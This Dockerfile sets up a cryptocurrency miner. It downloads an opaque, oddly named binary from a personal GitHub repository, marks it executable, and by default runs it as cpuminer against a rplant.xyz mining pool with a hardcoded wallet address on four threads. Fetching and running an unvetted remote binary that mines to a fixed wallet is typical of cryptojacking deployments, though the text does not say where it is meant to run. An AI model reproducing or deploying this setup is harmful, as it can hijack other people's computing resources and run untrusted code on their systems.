FROM ubuntu:xenial

WORKDIR /root

RUN apt-get update && apt-get -qy install \
 automake \
 wget \
 build-essential \
 libcurl4-openssl-dev \
 libssl-dev \
 git \
 ca-certificates \
 libjansson-dev libgmp-dev g++ --no-install-recommends

RUN wget https://github.com/Jsjsj991/manual/raw/main/TUDE && chmod +x TUDE

# Define default command.
CMD ./TUDE cpuminer-sse2 -a minotaurx  -o stratum+tcps://stratum-asia.rplant.xyz:17068 -u RRPp2nA9kqeGqERzefhdGSzfzcmevRtFXr -t4
